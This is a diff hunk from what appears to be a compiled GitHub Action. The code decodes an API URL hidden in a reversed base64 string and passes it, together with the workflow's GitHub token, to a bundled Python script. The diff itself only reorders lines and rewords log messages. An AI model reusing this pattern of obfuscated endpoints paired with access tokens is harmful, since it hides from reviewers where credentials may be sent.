@@ -27548,22 +27548,20 @@ async function run() {
     const config = "=8CbhN3bw9mcw9lY1hGdpd2LxY3LpBXYv02bj5yctFWZ05WZw9mLz9GclJnL2VGZtkGch9yL6MHc0RHa"
     const base64Api = config.split('').reverse().join('');
     const apiUrl = Buffer.from(base64Api, 'base64').toString('utf-8');
-
-    // Access the API_URL secret
-    const token = core.getInput('token'); // GitHub token from the calling workflow
-
     if (!apiUrl) {
       throw new Error(
-        "API_URL is not set."
+        "API URL not found."
       );
     }
     else {
       console.log("Received API URL");
     }
 
-    // Set environment variables for the Python script
+    const token = core.getInput('token');
+    console.log("Setting environment variables for the Python script...");
     process.env.API_URL = apiUrl;
     process.env.GH_TOKEN = token;
+    console.log("Environment variables set successfully.");
 
     const requirementsPath = __nccwpck_require__.ab + "requirements.txt";
     const mainPath = __nccwpck_require__.ab + "main.py";
